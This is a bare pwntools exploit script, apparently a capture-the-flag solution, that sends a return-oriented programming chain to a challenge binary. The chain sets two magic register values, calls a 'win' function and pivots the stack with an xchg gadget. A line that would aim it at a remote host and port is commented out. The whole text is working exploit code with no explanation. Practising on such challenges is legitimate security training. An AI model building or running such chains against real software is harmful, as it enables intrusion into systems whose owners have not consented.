from pwn import *
#r=gdb.debug("./chall","b*main+69")
r=process("./chall")
#r=remote("102.220.29.203",4103)
pop_rax=p64(0x004012fd)
pop_r8=p64(0x004012fc)
mov_rdi_rax=p64(0x004012f4) #mov rdi, rax; pop rax; ret;
win=p64(0x401216)
mov_rsi_r8=p64(0x00401307)
ret=p64(0x00401380)
pad=p8(0x41)*48
pivot=p64(0x00401303)  # xchg rsp,rsi; ret;

r.sendline(pop_rax+p64(0xcafebabe)+mov_rdi_rax+p64(0)+pop_r8+p64(0xdeadbeef)+mov_rsi_r8+ret+win+pad+pivot)
r.interactive()
